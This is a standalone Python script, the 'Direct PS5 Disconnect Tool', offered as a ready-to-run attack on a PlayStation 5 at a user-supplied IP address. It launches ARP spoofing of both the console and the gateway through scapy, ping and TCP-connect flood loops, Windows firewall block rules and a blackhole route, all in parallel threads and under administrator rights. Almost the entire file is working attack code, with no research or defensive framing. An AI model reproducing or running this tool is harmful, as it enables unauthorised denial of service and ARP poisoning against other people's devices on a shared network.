#!/usr/bin/env python3
"""
Direct PS5 Disconnect Tool
Standalone tool for PS5 network disruption - bypasses GUI issues
"""

import subprocess
import socket
import time
import platform
import os
import sys
import threading
from typing import Dict, List, Optional

def check_admin_privileges() -> bool:
    """Check if running with administrator privileges"""
    try:
        if platform.system() == "Windows":
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except:
        return False

def get_local_network_info() -> Dict:
    """Get local network information"""
    try:
        # Get local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        
        # Get gateway IP
        gateway_ip = None
        if platform.system() == "Windows":
            result = subprocess.run(["route", "print"], capture_output=True, text=True, timeout=5)
            for line in result.stdout.split('\n'):
                if '0.0.0.0' in line and '0.0.0.0' not in line.split()[1]:
                    parts = line.split()
                    if len(parts) >= 3:
                        gateway_ip = parts[2]
                        break
        else:
            result = subprocess.run(["route", "-n"], capture_output=True, text=True, timeout=5)
            for line in result.stdout.split('\n'):
                if 'UG' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        gateway_ip = parts[1]
                        break
        
        if not gateway_ip:
            gateway_ip = "192.168.1.1"  # Default fallback
        
        return {
            "local_ip": local_ip,
            "gateway_ip": gateway_ip,
            "subnet": '.'.join(local_ip.split('.')[:-1]) + '.0/24'
        }
    except Exception as e:
        print(f"❌ Error getting network info: {e}")
        return {
            "local_ip": "192.168.1.100",
            "gateway_ip": "192.168.1.1",
            "subnet": "192.168.1.0/24"
        }

def test_ps5_connectivity(ps5_ip: str) -> bool:
    """Test basic connectivity to PS5"""
    try:
        if platform.system() == "Windows":
            result = subprocess.run(["ping", "-n", "1", "-w", "1000", ps5_ip], 
                                  capture_output=True, text=True, timeout=5)
        else:
            result = subprocess.run(["ping", "-c", "1", "-W", "1", ps5_ip], 
                                  capture_output=True, text=True, timeout=5)
        
        return result.returncode == 0
    except Exception as e:
        print(f"❌ Ping test failed: {e}")
        return False

def arp_spoof_attack(ps5_ip: str, gateway_ip: str, stop_event: threading.Event):
    """ARP spoofing attack to disrupt PS5 network"""
    print(f"🎯 Starting ARP spoofing attack on PS5 ({ps5_ip})")
    
    try:
        # Install scapy if not available
        try:
            from scapy.all import *
        except ImportError:
            print("📦 Installing scapy...")
            subprocess.run([sys.executable, "-m", "pip", "install", "scapy"], 
                         capture_output=True, timeout=30)
            from scapy.all import *
        
        while not stop_event.is_set():
            try:
                # Send ARP spoof packets
                arp_spoof = ARP(op=2, pdst=ps5_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
                send(arp_spoof, verbose=False)
                
                arp_spoof = ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=ps5_ip)
                send(arp_spoof, verbose=False)
                
                time.sleep(1)  # Send every second
                
            except Exception as e:
                print(f"❌ ARP spoof error: {e}")
                break
                
    except Exception as e:
        print(f"❌ ARP spoof attack failed: {e}")

def icmp_flood_attack(ps5_ip: str, stop_event: threading.Event):
    """ICMP flood attack to disrupt PS5 network"""
    print(f"🌊 Starting ICMP flood attack on PS5 ({ps5_ip})")
    
    try:
        while not stop_event.is_set():
            try:
                # Send ICMP flood packets
                if platform.system() == "Windows":
                    subprocess.run(["ping", "-n", "1", "-w", "1", ps5_ip], 
                                 capture_output=True, timeout=1)
                else:
                    subprocess.run(["ping", "-c", "1", "-W", "1", ps5_ip], 
                                 capture_output=True, timeout=1)
                
                time.sleep(0.1)  # Send rapidly
                
            except Exception as e:
                print(f"❌ ICMP flood error: {e}")
                break
                
    except Exception as e:
        print(f"❌ ICMP flood attack failed: {e}")

def tcp_flood_attack(ps5_ip: str, stop_event: threading.Event):
    """TCP flood attack to disrupt PS5 network"""
    print(f"🌊 Starting TCP flood attack on PS5 ({ps5_ip})")
    
    try:
        while not stop_event.is_set():
            try:
                # Send TCP flood packets
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect_ex((ps5_ip, 80))
                sock.close()
                
                time.sleep(0.05)  # Send very rapidly
                
            except Exception:
                pass  # Ignore connection errors
                
    except Exception as e:
        print(f"❌ TCP flood attack failed: {e}")

def windows_firewall_block(ps5_ip: str, stop_event: threading.Event):
    """Windows Firewall blocking for PS5"""
    print(f"🛡️ Starting Windows Firewall block for PS5 ({ps5_ip})")
    
    try:
        # Add firewall rules
        rule_name_in = f"PS5Block_{ps5_ip.replace('.', '_')}_In"
        rule_name_out = f"PS5Block_{ps5_ip.replace('.', '_')}_Out"
        
        # Inbound rule
        subprocess.run([
            "netsh", "advfirewall", "firewall", "add", "rule",
            f"name={rule_name_in}",
            "dir=in", "action=block", f"remoteip={ps5_ip}", "enable=yes"
        ], capture_output=True, timeout=5)
        
        # Outbound rule
        subprocess.run([
            "netsh", "advfirewall", "firewall", "add", "rule",
            f"name={rule_name_out}",
            "dir=out", "action=block", f"remoteip={ps5_ip}", "enable=yes"
        ], capture_output=True, timeout=5)
        
        print(f"✅ Firewall rules added for {ps5_ip}")
        
        # Keep rules active until stopped
        while not stop_event.is_set():
            time.sleep(1)
            
    except Exception as e:
        print(f"❌ Windows Firewall block failed: {e}")

def route_blackhole(ps5_ip: str, stop_event: threading.Event):
    """Route blackhole for PS5"""
    print(f"🕳️ Starting route blackhole for PS5 ({ps5_ip})")
    
    try:
        # Add blackhole route
        subprocess.run([
            "route", "add", ps5_ip, "0.0.0.0", "metric", "1"
        ], capture_output=True, timeout=5)
        
        print(f"✅ Route blackhole added for {ps5_ip}")
        
        # Keep route active until stopped
        while not stop_event.is_set():
            time.sleep(1)
            
    except Exception as e:
        print(f"❌ Route blackhole failed: {e}")

class PS5Disconnector:
    """PS5 Network Disconnector"""
    
    def __init__(self, ps5_ip: str):
        self.ps5_ip = ps5_ip
        self.stop_event = threading.Event()
        self.attack_threads = []
        self.network_info = get_local_network_info()
    
    def start_attacks(self):
        """Start all attack methods"""
        print(f"🎮 Starting PS5 disconnect attacks on {self.ps5_ip}")
        print("=" * 50)
        
        # Test connectivity first
        if not test_ps5_connectivity(self.ps5_ip):
            print(f"❌ PS5 {self.ps5_ip} is not reachable")
            return False
        
        print(f"✅ PS5 {self.ps5_ip} is reachable - starting attacks")
        
        # Start different attack methods
        attack_methods = [
            ("ARP Spoof", lambda: arp_spoof_attack(self.ps5_ip, self.network_info['gateway_ip'], self.stop_event)),
            ("ICMP Flood", lambda: icmp_flood_attack(self.ps5_ip, self.stop_event)),
            ("TCP Flood", lambda: tcp_flood_attack(self.ps5_ip, self.stop_event)),
            ("Firewall Block", lambda: windows_firewall_block(self.ps5_ip, self.stop_event)),
            ("Route Blackhole", lambda: route_blackhole(self.ps5_ip, self.stop_event))
        ]
        
        for method_name, attack_func in attack_methods:
            try:
                thread = threading.Thread(target=attack_func, daemon=True)
                thread.start()
                self.attack_threads.append(thread)
                print(f"✅ {method_name} attack started")
            except Exception as e:
                print(f"❌ Failed to start {method_name}: {e}")
        
        return True
    
    def stop_attacks(self):
        """Stop all attack methods"""
        print(f"🛑 Stopping PS5 disconnect attacks")
        
        # Signal threads to stop
        self.stop_event.set()
        
        # Wait for threads to finish
        for thread in self.attack_threads:
            thread.join(timeout=5)
        
        print(f"✅ All attacks stopped")

def main():
    """Main function"""
    print("🎮 Direct PS5 Disconnect Tool")
    print("=" * 40)
    
    # Check admin privileges
    if not check_admin_privileges():
        print("❌ This tool requires administrator privileges")
        print("Right-click and select 'Run as administrator'")
        input("Press Enter to exit...")
        return
    
    print("✅ Administrator privileges confirmed")
    
    # Get PS5 IP
    ps5_ip = input("Enter PS5 IP address: ").strip()
    if not ps5_ip:
        print("❌ No IP address provided")
        return
    
    # Create disconnector
    disconnector = PS5Disconnector(ps5_ip)
    
    try:
        # Start attacks
        if disconnector.start_attacks():
            print(f"\n🎯 Attacks running on {ps5_ip}")
            print("Press Enter to stop attacks...")
            input()
        else:
            print("❌ Failed to start attacks")
            
    except KeyboardInterrupt:
        print("\n🛑 Interrupted by user")
    finally:
        # Stop attacks
        disconnector.stop_attacks()
    
    print("✅ PS5 disconnect tool completed")

if __name__ == "__main__":
    main() 